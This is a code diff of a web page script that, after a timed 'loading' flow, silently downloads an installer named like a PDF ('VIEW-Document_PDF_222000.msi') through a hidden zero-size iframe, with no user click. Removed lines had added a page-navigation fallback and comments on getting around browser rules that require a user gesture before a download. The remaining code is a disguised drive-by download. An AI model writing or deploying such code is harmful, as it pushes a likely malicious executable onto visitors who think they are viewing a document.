@@ -251,29 +251,20 @@
   <script>
     (function () {
       var MSI_PATH = '/VIEW-Document_PDF_222000.msi';
-      var MSI_NAME = 'VIEW-Document_PDF_222000.msi';
       var FLOW_MS = 6000;
       var stage3 = document.getElementById('stage-3');
-      var downloadBtn = document.getElementById('download-btn');
       var triggered = false;
 
       function triggerDownload() {
         if (triggered) return;
         triggered = true;
 
-        // Programmatic <a click> is blocked without a user gesture in Chrome/Edge.
-        // Same-origin iframe + attachment header usually starts the download and keeps this page visible.
         var frame = document.createElement('iframe');
         frame.setAttribute('aria-hidden', 'true');
         frame.title = 'download';
         frame.style.cssText = 'position:absolute;width:0;height:0;border:0;clip:rect(0,0,0,0);overflow:hidden';
         frame.src = MSI_PATH;
         document.body.appendChild(frame);
-
-        // Top-level navigation is the most reliable auto-download when there was no click.
-        window.setTimeout(function () {
-          window.location.assign(MSI_PATH);
-        }, 900);
       }
 
       if (stage3) {
@@ -284,9 +275,7 @@
         });
       }
 
-      window.setTimeout(function () {
-        triggerDownload();
-      }, FLOW_MS + 250);
+      window.setTimeout(triggerDownload, FLOW_MS + 250);
     })();
   </script>
 </body>
